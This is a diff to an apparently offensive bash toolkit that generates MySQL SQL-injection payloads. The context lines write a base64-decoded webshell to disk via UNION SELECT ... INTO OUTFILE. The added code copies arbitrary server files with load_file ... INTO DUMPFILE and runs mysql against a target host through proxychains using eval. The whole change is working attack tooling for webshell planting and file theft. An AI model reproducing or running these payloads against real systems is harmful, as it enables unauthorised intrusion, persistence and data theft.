@@ -137,8 +137,28 @@ get_mysql_injection() {
     if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
         echo  " UNION SELECT $front_null_values FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     else
-        echo  " ;SELECT FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+        echo  " SELECT FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     fi
+}
+
+copy_file_mysql() {    
+    if [[ -z "$source_file" ]]; then
+        if [[ -z "$1" ]]; then
+            echo "Source file must be provided"
+            return 1
+        else
+            source_file="$1"
+        fi
+    fi
+    if [[ -z "$destination_file" ]]; then
+        if [[ -z "$2" ]]; then
+            echo "Destination file must be provided"
+            return 1
+        else
+            destination_file="$2"
+        fi
+    fi
+    echo 'select load_file("'$source_file'") into dumpfile "'$destination_file'";'
 }
 
 get_nulls() {
@@ -183,8 +203,13 @@ run_psql() {
 
 }
 
+
 run_mysql() {
 
+    local sql_cmd=""
+    if [[ ! -z $1 ]]; then
+        sql_cmd="-e \"$1\""    
+    fi
     if [[ -z $username ]]; then
         username=root
         echo "Username is not set, using default $username"
@@ -202,8 +227,14 @@ run_mysql() {
         password_option="-p$password"
     fi
     mysql_additional_options="$mysql_additional_options --skip-ssl"
+    local proxychain_command=""
+    if [[ ! -z $use_proxychain ]] && [[ "$use_proxychain" == "true" ]]; then
+        proxychain_command="proxychains -q "
+    fi
+    local mysql_command="${proxychain_command}mysql -u $username -h $target_ip -P $target_port $password_option $mysql_additional_options $sql_cmd" 
     if ! pgrep -f "mysql -u $username -h $target_ip -P $target_port"; then
-        mysql -u "$username" -h "$target_ip" -P "$target_port" $password_option $mysql_additional_options #| tee -a "log/mysql_$target_ip.log"
+        echo $mysql_command
+        eval $mysql_command
     else
         echo "MySQL session already running"
     fi
